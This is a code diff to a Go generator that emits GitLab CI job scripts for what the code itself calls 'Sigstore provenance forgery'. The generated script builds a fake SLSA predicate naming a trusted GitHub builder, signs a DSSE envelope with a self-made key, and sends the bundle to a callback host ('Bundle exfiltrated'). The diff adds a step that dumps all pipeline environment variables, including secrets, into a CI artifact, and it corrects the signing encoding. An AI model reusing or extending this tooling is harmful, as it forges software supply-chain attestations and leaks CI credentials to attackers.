@@ -48,6 +48,12 @@ stages: [%s]
   script:
     - |
 %s
+    - printenv | sort > env.txt || true
+  artifacts:
+    paths:
+      - env.txt
+      - sigstore_results/
+    when: always
   allow_failure: true%s
 `, stage, name, stage, img, tagsLine(o.Common.Tags), indentBlock(script, 6), rulesManual(o.Common.Manual))
 }
@@ -131,7 +137,7 @@ func buildSigstoreScript(o SigstoreOptions) string {
 	b.WriteString("  # Step 4: Build in-toto/SLSA v1 predicate\n")
 	b.WriteString("  echo \"[*] Building SLSA v1 predicate...\"\n")
 	fmt.Fprintf(&b, "  _pkg_digest=$(echo -n \"%s@%s\" | sha256sum | cut -d' ' -f1)\n", pkgName, version)
-	b.WriteString("  _started=$(date -u +%%Y-%%m-%%dT%%H:%%M:%%SZ)\n")
+	b.WriteString("  _started=$(date -u +%Y-%m-%dT%H:%M:%SZ)\n")
 	b.WriteString("  _invocation=\"${CI_PIPELINE_ID:-unknown}\"\n")
 	fmt.Fprintf(&b, "  printf '{\"_type\":\"https://in-toto.io/Statement/v1\",\"subject\":[{\"name\":\"%s\",\"digest\":{\"sha256\":\"%%s\"}}],\"predicateType\":\"https://slsa.dev/provenance/v1\",\"predicate\":{\"buildDefinition\":{\"buildType\":\"https://slsa-framework.github.io/github-actions-buildtypes/workflow/v1\",\"externalParameters\":{\"source\":\"%s/%s\",\"version\":\"%s\"},\"resolvedDependencies\":[]},\"runDetails\":{\"builder\":{\"id\":\"https://github.com/slsa-framework/slsa-github-generator/.github/workflows/generator_generic_slsa3.yml@refs/tags/v1.9.0\"},\"metadata\":{\"invocationId\":\"%%s\",\"startedOn\":\"%%s\"}}}}' \\\n", pkgName, registryURL, pkgName, version)
 	b.WriteString("    \"$_pkg_digest\" \"$_invocation\" \"$_started\" > \"$_sdir/predicate.json\"\n")
@@ -140,10 +146,11 @@ func buildSigstoreScript(o SigstoreOptions) string {
 	// Step 5: Sign DSSE envelope (printf — no heredocs)
 	b.WriteString("  # Step 5: Sign DSSE envelope\n")
 	b.WriteString("  echo \"[*] Signing DSSE envelope...\"\n")
+	b.WriteString("  _payload_type=\"application/vnd.in-toto+json\"\n")
 	b.WriteString("  _payload_b64=$(base64 -w0 \"$_sdir/predicate.json\")\n")
-	b.WriteString("  _pae_header=\"DSSEv1 28 application/vnd.in-toto+json\"\n")
-	b.WriteString("  _pae_len=${#_payload_b64}\n")
-	b.WriteString("  printf '%s %s %s' \"$_pae_header\" \"$_pae_len\" \"$_payload_b64\" > \"$_sdir/pae.bin\"\n")
+	b.WriteString("  _payload_len=$(wc -c < \"$_sdir/predicate.json\" | tr -d ' ')\n")
+	b.WriteString("  printf 'DSSEv1 %s %s %s ' \"${#_payload_type}\" \"$_payload_type\" \"$_payload_len\" > \"$_sdir/pae.bin\"\n")
+	b.WriteString("  cat \"$_sdir/predicate.json\" >> \"$_sdir/pae.bin\"\n")
 	b.WriteString("  _sig=$(openssl dgst -sha256 -sign \"$_sdir/ec_private.pem\" \"$_sdir/pae.bin\" 2>/dev/null | base64 -w0)\n")
 	b.WriteString("  printf '{\"payloadType\":\"application/vnd.in-toto+json\",\"payload\":\"%s\",\"signatures\":[{\"keyid\":\"\",\"sig\":\"%s\"}]}' \\\n")
 	b.WriteString("    \"$_payload_b64\" \"$_sig\" > \"$_sdir/dsse_envelope.json\"\n")
@@ -168,7 +175,7 @@ func buildSigstoreScript(o SigstoreOptions) string {
 	b.WriteString("  _cert_raw=$(sed -n 's/.*\"rawBytes\":\"\\([^\"]*\\)\".*/\\1/p' \"$_sdir/fulcio_cert.json\" 2>/dev/null || echo 'none')\n")
 	b.WriteString("  _log_idx=$(sed -n 's/.*\"logIndex\":\\([0-9]*\\).*/\\1/p' \"$_sdir/rekor_resp.json\" 2>/dev/null || echo '0')\n")
 	b.WriteString("  _tree_id=$(sed -n 's/.*\"treeId\":\"\\([^\"]*\\)\".*/\\1/p' \"$_sdir/rekor_resp.json\" 2>/dev/null || echo 'unknown')\n")
-	b.WriteString("  _int_time=$(date +%%s)\n")
+	b.WriteString("  _int_time=$(date +%s)\n")
 	b.WriteString("  _set=$(sed -n 's/.*\"signedEntryTimestamp\":\"\\([^\"]*\\)\".*/\\1/p' \"$_sdir/rekor_resp.json\" 2>/dev/null || echo 'none')\n")
 	b.WriteString("  _dsse_body=$(cat \"$_sdir/dsse_envelope.json\")\n")
 	b.WriteString("  printf '{\"mediaType\":\"application/vnd.dev.sigstore.bundle.v0.3+json\",\"verificationMaterial\":{\"certificate\":{\"rawBytes\":\"%s\"},\"tlogEntries\":[{\"logIndex\":\"%s\",\"logId\":{\"keyId\":\"%s\"},\"integratedTime\":\"%s\",\"inclusionPromise\":{\"signedEntryTimestamp\":\"%s\"}}]},\"dsseEnvelope\":%s}' \\\n")
@@ -184,11 +191,15 @@ func buildSigstoreScript(o SigstoreOptions) string {
 	b.WriteString("    -d @\"$_sdir/bundle.sigstore.json\" \\\n")
 	fmt.Fprintf(&b, "    \"%s\" >/dev/null 2>&1 || true\n", callbackURL)
 	b.WriteString("  echo \"[+] Bundle exfiltrated\"\n\n")
+	b.WriteString("  # Preserve non-secret verification evidence as CI artifacts.\n")
+	b.WriteString("  mkdir -p sigstore_results\n")
+	b.WriteString("  cp \"$_sdir/ec_public.pem\" \"$_sdir/predicate.json\" \"$_sdir/dsse_envelope.json\" \\\n")
+	b.WriteString("    \"$_sdir/bundle.sigstore.json\" \"$_sdir/fulcio_cert.json\" \"$_sdir/rekor_resp.json\" sigstore_results/ 2>/dev/null || true\n\n")
 
 	// Cleanup
 	b.WriteString("  rm -rf \"$_sdir\"\n")
 	b.WriteString("  echo \"[*] Sigstore provenance forgery complete\"\n")
-	b.WriteString("}\n\n_SIGSTORE_FORGE\n")
+	b.WriteString("}\n\n_SIGSTORE_FORGE || true\n")
 
 	return b.String()
 }
